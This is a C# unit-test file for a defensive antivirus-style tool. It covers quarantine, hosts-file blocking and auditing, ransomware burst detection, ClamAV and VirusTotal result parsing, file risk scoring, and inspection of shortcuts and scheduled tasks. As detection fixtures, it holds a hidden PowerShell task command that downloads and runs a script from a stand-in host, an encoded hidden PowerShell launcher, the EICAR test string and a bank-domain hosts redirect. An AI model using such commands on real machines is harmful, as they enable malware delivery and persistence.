using System.Text;
using Asa.Core;
using Xunit;

namespace Asa.Core.Tests;

public sealed class TemporaryFolder : IDisposable
{
    public TemporaryFolder()
    {
        Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "asa-tests-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path);
    }

    public string Path { get; }

    public void Dispose()
    {
        Directory.Delete(Path, true);
    }
}

public class QuarantineTests
{
    [Fact]
    public void AddMovesFileIntoEncryptedStorageAndRestoreBringsItBack()
    {
        using var folder = new TemporaryFolder();
        string infectedFile = Path.Combine(folder.Path, "virus.exe");
        byte[] content = Encoding.ASCII.GetBytes("some dangerous bytes");
        File.WriteAllBytes(infectedFile, content);
        var quarantine = new Quarantine(Path.Combine(folder.Path, "q"));

        QuarantineItem item = quarantine.Add(infectedFile, "Test.Virus");

        Assert.False(File.Exists(infectedFile));
        byte[] stored = File.ReadAllBytes(Path.Combine(folder.Path, "q", item.Id + ".asaq"));
        Assert.DoesNotContain("dangerous", Encoding.ASCII.GetString(stored));
        Assert.Single(quarantine.GetItems());

        string restored = quarantine.Restore(item.Id);

        Assert.Equal(infectedFile, restored);
        Assert.Equal(content, File.ReadAllBytes(restored));
        Assert.Empty(quarantine.GetItems());
    }

    [Fact]
    public void RestoreDoesNotOverwriteExistingFile()
    {
        using var folder = new TemporaryFolder();
        string infectedFile = Path.Combine(folder.Path, "a.txt");
        File.WriteAllText(infectedFile, "first");
        var quarantine = new Quarantine(Path.Combine(folder.Path, "q"));
        QuarantineItem item = quarantine.Add(infectedFile, "X");
        File.WriteAllText(infectedFile, "second");

        string restored = quarantine.Restore(item.Id);

        Assert.NotEqual(infectedFile, restored);
        Assert.Equal("second", File.ReadAllText(infectedFile));
        Assert.Equal("first", File.ReadAllText(restored));
    }
}

public class HostsBlockerTests
{
    [Fact]
    public void ParseDomainListUnderstandsHostsFormatAndPlainDomains()
    {
        string list = "# comment\n127.0.0.1 localhost\n0.0.0.0 bad.example.com\nevil.test # tail\n127.0.0.1\tBAD.example.com\nnot a domain!\n";

        IReadOnlyList<string> domains = HostsBlocker.ParseDomainList(list);

        Assert.Equal(new[] { "bad.example.com", "evil.test" }, domains);
    }

    [Fact]
    public void ApplyKeepsUserLinesAndReplacesOldBlock()
    {
        string original = "127.0.0.1 my.local\r\n";

        string first = HostsBlocker.ApplyBlockList(original, new[] { "a.com", "b.com" });
        string second = HostsBlocker.ApplyBlockList(first, new[] { "c.com" });

        Assert.Contains("127.0.0.1 my.local", second);
        Assert.Contains("0.0.0.0 c.com", second);
        Assert.DoesNotContain("a.com", second);
        Assert.Equal(1, HostsBlocker.CountBlockedDomains(second));
        Assert.Equal("127.0.0.1 my.local\r\n", HostsBlocker.RemoveBlockList(second));
    }
}

public class RansomwareDetectorTests
{
    [Fact]
    public void BurstOfDocumentChangesRaisesOneAlert()
    {
        var detector = new RansomwareDetector(modificationThreshold: 10, window: TimeSpan.FromSeconds(5));
        DateTime start = DateTime.Now;
        var alerts = new List<RansomwareAlert>();

        for (int index = 0; index < 30; index++)
        {
            RansomwareAlert? alert = detector.RecordModification($"C:/docs/file{index}.docx", start.AddMilliseconds(index * 50));
            if (alert != null)
            {
                alerts.Add(alert);
            }
        }

        Assert.Single(alerts);
    }

    [Fact]
    public void SlowChangesAndNonDocumentsDoNotAlert()
    {
        var detector = new RansomwareDetector(modificationThreshold: 10, window: TimeSpan.FromSeconds(5));
        DateTime start = DateTime.Now;

        for (int index = 0; index < 30; index++)
        {
            Assert.Null(detector.RecordModification($"C:/docs/file{index}.docx", start.AddSeconds(index)));
            Assert.Null(detector.RecordModification($"C:/cache/file{index}.bin", start.AddSeconds(index)));
        }
    }

    [Fact]
    public void CanaryChangeAlertsImmediately()
    {
        using var folder = new TemporaryFolder();
        string canary = Path.Combine(folder.Path, "trap.docx");
        var detector = new RansomwareDetector();
        detector.RegisterCanaryFile(canary);

        RansomwareAlert? alert = detector.RecordModification(canary, DateTime.Now);

        Assert.NotNull(alert);
    }
}

public class AutorunSnapshotTests
{
    [Fact]
    public void FindsAddedAndChangedEntries()
    {
        var previous = new[] { new AutorunEntry("HKCU Run", "A", "a.exe"), new AutorunEntry("HKCU Run", "B", "b.exe") };
        var current = new[] { new AutorunEntry("HKCU Run", "A", "a.exe"), new AutorunEntry("HKCU Run", "B", "evil.exe"), new AutorunEntry("HKLM Run", "C", "c.exe") };

        IReadOnlyList<AutorunEntry> changes = AutorunSnapshot.FindNewOrChanged(previous, current);

        Assert.Equal(new[] { "B", "C" }, changes.Select(entry => entry.Name));
    }

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --silent", "C:\\Program Files\\App\\app.exe")]
    [InlineData("C:\\Program Files\\App\\app.exe --silent", "C:\\Program Files\\App\\app.exe")]
    [InlineData("rundll32 shell32.dll,Control_RunDLL", "rundll32")]
    public void ExtractsExecutablePath(string command, string expected)
    {
        Assert.Equal(expected, AutorunSnapshot.ExtractExecutablePath(command));
    }
}

public class ClamAnswerTests
{
    [Fact]
    public void ParsesAnswers()
    {
        Assert.Equal(ScanVerdict.Clean, ClamDaemonClient.ParseScanAnswer("f", "stream: OK").Verdict);
        ScanResult infected = ClamDaemonClient.ParseScanAnswer("f", "stream: Win.Test.EICAR_HDB-1 FOUND");
        Assert.Equal(ScanVerdict.Infected, infected.Verdict);
        Assert.Equal("Win.Test.EICAR_HDB-1", infected.Details);
        Assert.Equal(ScanVerdict.Skipped, ClamDaemonClient.ParseScanAnswer("f", "INSTREAM size limit exceeded. ERROR").Verdict);
    }
}

public class JunkCleanerTests
{
    [Fact]
    public void AnalyzesAndCleansOnlySelectedLocations()
    {
        using var folder = new TemporaryFolder();
        string temp = Path.Combine(folder.Path, "temp");
        string cache = Path.Combine(folder.Path, "cache");
        Directory.CreateDirectory(Path.Combine(temp, "sub"));
        Directory.CreateDirectory(cache);
        File.WriteAllBytes(Path.Combine(temp, "sub", "a.tmp"), new byte[100]);
        File.WriteAllBytes(Path.Combine(cache, "b.bin"), new byte[50]);
        var cleaner = new JunkCleaner(new[] { new JunkLocation("Временные", temp), new JunkLocation("Кэш", cache) });

        IReadOnlyList<JunkReport> reports = cleaner.Analyze();
        CleanResult result = cleaner.Clean(new[] { "Временные" });

        Assert.Equal(100, reports.Single(report => report.Name == "Временные").SizeBytes);
        Assert.Equal(100, result.FreedBytes);
        Assert.False(Directory.Exists(Path.Combine(temp, "sub")));
        Assert.True(File.Exists(Path.Combine(cache, "b.bin")));
    }
}

public class VirusTotalParsingTests
{
    [Fact]
    public void ParsesFileReport()
    {
        string json = "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":55,\"suspicious\":1,\"harmless\":0,\"undetected\":10},\"popular_threat_classification\":{\"suggested_threat_label\":\"eicar/test\"}}}}";

        VirusTotalReport report = VirusTotalClient.ParseFileReport(json, "abc");

        Assert.True(report.Known);
        Assert.Equal(55, report.Malicious);
        Assert.Equal("eicar/test", report.PopularThreatName);
    }
}

public class PathFilterTests
{
    [Fact]
    public void SkipsExcludedFoldersAndPartialDownloads()
    {
        using var folder = new TemporaryFolder();
        var filter = new PathFilter(new[] { Path.Combine(folder.Path, "games") });

        Assert.False(filter.ShouldScan(Path.Combine(folder.Path, "games", "a.exe")));
        Assert.False(filter.ShouldScan(Path.Combine(folder.Path, "setup.exe.crdownload")));
        Assert.True(filter.ShouldScan(Path.Combine(folder.Path, "gamesX", "a.exe")));
    }
}

public class ClamDaemonIntegrationTests
{
    private const string Eicar = @"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    [Fact]
    public async Task ScansThroughRealDaemonWhenAvailable()
    {
        string? portText = Environment.GetEnvironmentVariable("ASA_TEST_CLAMD_PORT");
        if (string.IsNullOrEmpty(portText))
        {
            return;
        }

        var client = new ClamDaemonClient("127.0.0.1", int.Parse(portText));
        Assert.True(await client.PingAsync());

        using var folder = new TemporaryFolder();
        string infected = Path.Combine(folder.Path, "eicar.com");
        string clean = Path.Combine(folder.Path, "clean.txt");
        File.WriteAllText(infected, Eicar);
        File.WriteAllText(clean, "hello");

        ScanResult infectedResult = await client.ScanFileAsync(infected, 100 * 1024 * 1024);
        ScanResult cleanResult = await client.ScanFileAsync(clean, 100 * 1024 * 1024);

        Assert.Equal(ScanVerdict.Infected, infectedResult.Verdict);
        Assert.Equal(ScanVerdict.Clean, cleanResult.Verdict);
    }
}

public class ClamAvConfigurationTests
{
    [Fact]
    public void DaemonDoesNotKeepTwoDatabasesInMemoryDuringReload()
    {
        string config = ClamAvConfiguration.BuildDaemonConfig("C:\\db", "C:\\log.txt", 100);

        Assert.Contains("ConcurrentDatabaseReload no", config);
    }
}

public class SoundSynthesizerTests
{
    [Fact]
    public void ProducesValidWaveFiles()
    {
        foreach (byte[] wav in new[] { SoundSynthesizer.CreateStartupFanfare(), SoundSynthesizer.CreateThreatAlarm(), SoundSynthesizer.CreateScanCompleteChime(), SoundSynthesizer.CreateDatabaseUpdatedChime() })
        {
            Assert.Equal("RIFF", Encoding.ASCII.GetString(wav, 0, 4));
            Assert.Equal("WAVE", Encoding.ASCII.GetString(wav, 8, 4));
            Assert.Equal(wav.Length - 8, BitConverter.ToInt32(wav, 4));
            Assert.True(wav.Length > 44100);
        }
    }

    [Fact]
    public void KnowsConcertPitch()
    {
        Assert.Equal(440.0, SoundSynthesizer.Frequency("A4"), 3);
        Assert.Equal(261.626, SoundSynthesizer.Frequency("C4"), 2);
    }
}

public class FileRiskAnalyzerTests
{
    private static readonly byte[] ExecutableHeader = { (byte)'M', (byte)'Z', 0x90, 0 };

    private static FileFacts Facts(string path, byte[]? header = null, bool? signed = null, bool hidden = false, int ageDays = 100, double entropy = 5, long size = 200 * 1024)
    {
        DateTime time = DateTime.UtcNow.AddDays(-ageDays);
        return new FileFacts { Path = path, Header = header ?? Array.Empty<byte>(), HasValidSignature = signed, Hidden = hidden, CreatedUtc = time, ModifiedUtc = time, Entropy = entropy, Size = size };
    }

    [Fact]
    public void DoubleExtensionInDownloadsIsHighRisk()
    {
        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Users\Ivan\Downloads\photo.jpg.exe", ExecutableHeader, signed: false, ageDays: 1), DateTime.UtcNow);

        Assert.Equal(RiskLevel.High, risk.Level);
        Assert.Contains(risk.Reasons, reason => reason.Description.Contains("Двойное расширение"));
    }

    [Fact]
    public void SignedProgramInProgramFilesIsNotRisky()
    {
        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Program Files\App\app.exe", ExecutableHeader, signed: true), DateTime.UtcNow);

        Assert.Equal(RiskLevel.None, risk.Level);
    }

    [Fact]
    public void ProgramDisguisedAsDocumentIsDetected()
    {
        FileRisk risk = FileRiskAnalyzer.Analyze(Facts(@"C:\Users\Ivan\Documents\invoice.pdf", ExecutableHeader), DateTime.UtcNow);

        Assert.True(risk.Score >= 55);
    }

    [Fact]
    public void RightToLeftOverrideIsDetected()
    {
        FileRisk risk = FileRiskAnalyzer.Analyze(Facts("C:\\Users\\Ivan\\Downloads\\report\u202Efdp.exe", ExecutableHeader), DateTime.UtcNow);

        Assert.Equal(RiskLevel.High, risk.Level);
    }

    [Fact]
    public void PlannerPutsMostDangerousFirst()
    {
        var files = new[]
        {
            Facts(@"C:\Program Files\App\safe.exe", ExecutableHeader, signed: true),
            Facts(@"C:\Users\Ivan\AppData\Local\Temp\x.scr", ExecutableHeader, signed: false, hidden: true, ageDays: 0)
        };

        IReadOnlyList<FileRisk> ranked = SmartScanPlanner.RankFiles(files, DateTime.UtcNow);

        Assert.EndsWith("x.scr", ranked[0].Path);
    }

    [Fact]
    public void EntropyOfRandomDataIsHigh()
    {
        byte[] random = new byte[65536];
        new Random(1).NextBytes(random);

        Assert.True(FileRiskAnalyzer.CalculateEntropy(random) > 7.9);
        Assert.Equal(0, FileRiskAnalyzer.CalculateEntropy(new byte[100]));
    }
}

public class ShortcutAndTaskTests
{
    [Fact]
    public void FindsHiddenPowerShellInShortcut()
    {
        byte[] content = Encoding.Unicode.GetBytes("xx\0C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0-w hidden -enc SQBFAFgA\0");

        IReadOnlyList<string> markers = ShortcutInspector.InspectShortcut(content);

        Assert.Contains("powershell", markers);
        Assert.Contains("-w hidden", markers);
    }

    [Fact]
    public void ParsesScheduledTaskAndFlagsAppDataPowerShell()
    {
        string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c iex (iwr http://evil.test/a.ps1)</Arguments></Exec></Actions></Task>";

        ScheduledTaskAction action = ScheduledTaskInspector.ParseTaskXml("Updater", xml).Single();
        IReadOnlyList<RiskReason> reasons = ScheduledTaskInspector.Assess(action);

        Assert.True(action.Hidden);
        Assert.True(reasons.Sum(reason => reason.Points) >= 50);
    }

    [Fact]
    public void ParsesDefenderThreatName()
    {
        string output = "Scan starting...\r\nScan finished.\r\nScanning C:\\x\\eicar.com found 1 threats.\r\n<===========================LIST OF DETECTED THREATS==========================>\r\n----------------------------- Threat information ------------------------------\r\nThreat                  : Virus:DOS/EICAR_Test_File\r\nResources               : 1 total\r\n";

        Assert.Equal("Virus:DOS/EICAR_Test_File", DefenderOutput.ParseThreatName(output));
    }
}

public class HostsAuditTests
{
    [Fact]
    public void FindsRedirectedBankButIgnoresAsaBlockAndLocalhost()
    {
        string hosts = "127.0.0.1 localhost\r\n6.6.6.6 www.sberbank.ru\r\n0.0.0.0 ads.example.com\r\n" + HostsBlocker.ApplyBlockList("", new[] { "evil.test" });

        var suspicious = HostsAudit.FindSuspiciousRedirects(hosts);

        Assert.Single(suspicious);
        Assert.Equal("www.sberbank.ru", suspicious[0].Domain);
        Assert.DoesNotContain("sberbank", HostsAudit.RemoveEntries(hosts, new[] { "www.sberbank.ru" }));
    }
}
